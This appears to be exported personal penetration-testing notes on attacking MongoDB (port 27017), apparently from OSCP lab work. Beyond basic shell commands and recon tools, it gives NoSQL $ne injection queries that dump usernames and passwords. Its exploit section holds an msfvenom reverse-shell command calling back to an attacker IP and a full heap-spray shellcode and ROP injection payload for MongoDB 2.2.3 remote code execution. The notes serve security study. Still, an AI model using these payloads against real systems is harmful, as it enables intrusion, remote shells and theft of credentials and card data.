<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>27017 - MongoDB</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 27017 - MongoDB</h1></strong><br />• <a href="https://blog.rapid7.com/2016/07/28/pentesting-in-the-real-world-going-bananas-with-mongodb/">https://blog.rapid7.com/2016/07/28/pentesting-in-the-real-world-going-bananas-with-mongodb/</a><br />• <a href="https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/mongodb/mongodb_hacking.md">https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/mongodb/mongodb_hacking.md</a><br /><br />MongoDB is an open source schema less document oriented database system developed in C++. <br />It&#39;s one of the leading NoSQL database solutions.<br /><br />NoSQL is a type of database design that supports multiple different data models (key &amp; value, document, column, graph etc.). It&#39;s an alternative to traditional SQL databases where data is stored in tables and the data schema is carefully designed before the database is built. NoSQL is used when perfomance and scalability are more important than rigid data consistency.<br /><br />In MongoDB, data is stored in the form of JSON style document.<br />Some of the major features of MongoDB:<br />• Document Based<br />• High performance<br />• HIgh Availability<br />• Easy Scalability<br />• No Complex Joins<br /><br />By default, MongoDB:<br />• runs on port 27017<br />• doesn&#39;t require a password<br />   ◇ this is because MongoDB is only supposed to run locally (and not listen externally)<br /><br /><strong><h2>## About Mongo Databases</h2></strong><br />• MongoDB holds &quot;databases&quot;<br />• Each database contains one or more &quot;collections&quot;<br />   ◇ For a database to be shown, it must have at least 1 document in it<br />• Each collection holds one or more &quot;documents&quot;<br /><br />• MongoDB uses Javascript style queries<br /><br /><strong><h3>### MongoDB / Mongo Shell commands</h3></strong><br /><code>db</code> - check current database<br /><code>show dbs</code> - show databases<br /><code>use &lt;database&gt;</code><br /><code>show collections</code> - show collections in database<br /><code>db.&lt;collection&gt;.insert({&quot;username&quot;:&quot;spiderman&quot;})</code> - insert document into collection<br /><code>db.&lt;collection&gt;.find()</code> - query data in a collection<br /><code>db.&lt;collection&gt;.find({&quot;username&quot;:&quot;spiderman&quot;})</code> - query specific data in a collection<br /><code>db.&lt;collection&gt;.remove({&quot;username&quot;:&quot;spiderman&quot;})</code> - delete specific data in a collection<br /><code>db.&lt;collection&gt;.drop()</code> - delete a whole collection<br /><code>db.dropDatabase()</code> - delete current database<br /><br /><strong><h2>## Recon</h2></strong><br /><strong><h3>### Nmap scan for MongoDB</h3></strong><br /><code>nmap -p 27017 --script mongodb-brute &lt;ipadress&gt;</code><br /><code>nmap -Pn -p 27017 --script mongodb-databases x.x.x.x</code><br /><br /><strong><h3>### Metasploit</h3></strong><br /><code>msf &gt; use auxiliary/scanner/mongodb/mongodb_login<br />msf &gt; use auxiliary/gather/mongodb_js_inject_collection_enum<br />msf &gt; use exploit/linux/misc/mongod_native_helper</code><br /><br /><strong><h3>### NoSQLMap</h3></strong><br /><a href="https://github.com/codingo/NoSQLMap">https://github.com/codingo/NoSQLMap</a><br />Install dependencies:<br /><code>pip install couchdb<br />pip install pymongo<br />pip install ipcalc</code><br /><br />Run it:<br /><code>python nosqlmap.py</code><br /><br /><strong><h3>### Web</h3></strong><br /><code>http://&lt;ipaddress&gt;:28017/</code><br /><br /><strong><h2>## Attack</h2></strong><br />• REFER TO <code>Web &gt; NoSQL Injection</code> FOR MORE<br /><br /><code>$ne</code> means <code>not equal</code>.<br />The command below will find all documents where the <code>username = jim</code> and the <code>password != 0x00</code><br /><div class="codebox"><div class="codebox">&gt;&nbsp;db.users.find({&quot;username&quot;:&quot;jim&quot;,&nbsp;&quot;password&quot;:&nbsp;{$ne:&nbsp;&quot;0x00&quot;}})<br />{&nbsp;&quot;_id&quot;&nbsp;:&nbsp;ObjectId(&quot;55d5d719d60515e316247247&quot;),&nbsp;&quot;username&quot;&nbsp;:&nbsp;&quot;jim&quot;,&nbsp;&quot;password&quot;&nbsp;:&nbsp;&quot;jim&quot;,&nbsp;&quot;email&quot;&nbsp;:&nbsp;&quot;jim@gmail.com&quot;,&nbsp;&quot;cardnumber&quot;&nbsp;:&nbsp;54321&nbsp;}</div></div><br /><br />Here, we find all usernames and passwords in the db.<br />The command lists will find all documents where the <code>username != 0x00</code> and the <code>password != 0x00</code><br /><div class="codebox"><div class="codebox">&gt;&nbsp;db.users.find({&quot;username&quot;:&nbsp;{$ne:&nbsp;&quot;0x00&quot;},&nbsp;&quot;password&quot;:&nbsp;{$ne:&nbsp;&quot;0x00&quot;}})<br />{&nbsp;&quot;_id&quot;&nbsp;:&nbsp;ObjectId(&quot;55d5d6f2d60515e316247246&quot;),&nbsp;&quot;username&quot;&nbsp;:&nbsp;&quot;tom&quot;,&nbsp;&quot;password&quot;&nbsp;:&nbsp;&quot;tom&quot;,&nbsp;&quot;email&quot;&nbsp;:&nbsp;&quot;tom@gmail.com&quot;,&nbsp;&quot;cardnumber&quot;&nbsp;:&nbsp;12345&nbsp;}<br />{&nbsp;&quot;_id&quot;&nbsp;:&nbsp;ObjectId(&quot;55d5d719d60515e316247247&quot;),&nbsp;&quot;username&quot;&nbsp;:&nbsp;&quot;jim&quot;,&nbsp;&quot;password&quot;&nbsp;:&nbsp;&quot;jim&quot;,&nbsp;&quot;email&quot;&nbsp;:&nbsp;&quot;jim@gmail.com&quot;,&nbsp;&quot;cardnumber&quot;&nbsp;:&nbsp;54321&nbsp;}<br />{&nbsp;&quot;_id&quot;&nbsp;:&nbsp;ObjectId(&quot;55d5d739d60515e316247248&quot;),&nbsp;&quot;username&quot;&nbsp;:&nbsp;&quot;bob&quot;,&nbsp;&quot;password&quot;&nbsp;:&nbsp;&quot;bob&quot;,&nbsp;&quot;email&quot;&nbsp;:&nbsp;&quot;bob@gmail.com&quot;,&nbsp;&quot;cardnumber&quot;&nbsp;:&nbsp;22222&nbsp;}</div></div><code><br /></code><br /><code>http://localhost/index.php?username[$ne]=test&amp;password[$ne]=test</code><br /><br /><strong><h2>## Exploits</h2></strong><br /><strong><h3>### MongoDB 2.2.3 RCE</h3></strong><br /><a href="https://www.exploit-db.com/exploits/24947">https://www.exploit-db.com/exploits/24947</a><br /><br />Generate shellcode<br /><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.184 LPORT=9001 -f js_le</code><br /><br /><strong>#### Example</strong><br />From <code>oscp 10.11.1.237 - Humble</code><br /><br />1. Submit <code>&#39;</code> (or something else) and get error<br />2. Identify where code is being injected by reading the error<br />   e.g. <code>&#39;$where&#39;: &quot;this.CompanyName == </code><strong><code>&#39;</code></strong><code> &lt;your query here&gt; </code><strong><code>&#39;</code></strong><code> &quot;</code><br />3. Identify the characters needed for injection:<br />   e.g. <code>&#39;; &lt;INJECT&gt; &#39;</code><br />4. Trim down the exploit code in exploit above to what you need based on the command being run<br />5. Add on inject characters at start and end of exploit<br />6. Submit exploit and get shell<br /><br />Inject that worked for OSCP 10.11.1.237 - Humble:<br /><div class="codebox"><div class="codebox">&#39;;shellcode=unescape(&quot;%udb31%ue3f7%u4353%u6a53%u8902%ub0e1%ucd66%u9380%ub059%ucd3f%u4980%uf979%u0a68%u000b%u68b8%u0002%u2923%ue189%u66b0%u5150%ub353%u8903%ucde1%u5280%u6e68%u732f%u6868%u2f2f%u6962%ue389%u5352%ue189%u0bb0%u80cd&quot;);&nbsp;sizechunk=0x1000;&nbsp;chunk=&quot;&quot;;&nbsp;for(i=0;i&lt;sizechunk;i++){&nbsp;chunk+=unescape(&quot;%u9090%u9090&quot;);&nbsp;}&nbsp;chunk=chunk.substring(0,(sizechunk-shellcode.length));&nbsp;testarray=new&nbsp;Array();&nbsp;for(i=0;i&lt;25000;i++){&nbsp;testarray[i]=chunk+shellcode;&nbsp;}&nbsp;ropchain=unescape(&quot;%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000&quot;);&nbsp;sizechunk2=0x1000;&nbsp;chunk2=&quot;&quot;;&nbsp;for(i=0;i&lt;sizechunk2;i++){&nbsp;chunk2+=unescape(&quot;%u5a70%u0805&quot;);&nbsp;}&nbsp;chunk2=chunk2.substring(0,(sizechunk2-ropchain.length));&nbsp;testarray2=new&nbsp;Array();&nbsp;for(i=0;i&lt;25000;i++){&nbsp;testarray2[i]=chunk2+ropchain;&nbsp;}&nbsp;nativeHelper.apply({&quot;x&quot;&nbsp;:&nbsp;0x836e204},&nbsp;[&quot;A&quot;+&quot;\x26\x18\x35\x08&quot;+&quot;MongoSploit!&quot;+&quot;\x58\x71\x45\x08&quot;+&quot;sthack&nbsp;is&nbsp;a&nbsp;nice&nbsp;place&nbsp;to&nbsp;be&quot;+&quot;\x6c\x5a\x05\x08&quot;+&quot;\x20\x20\x20\x20&quot;+&quot;\x58\x71\x45\x08&quot;]);&#39;</div></div><br /><br /></div>
</body>
</html>
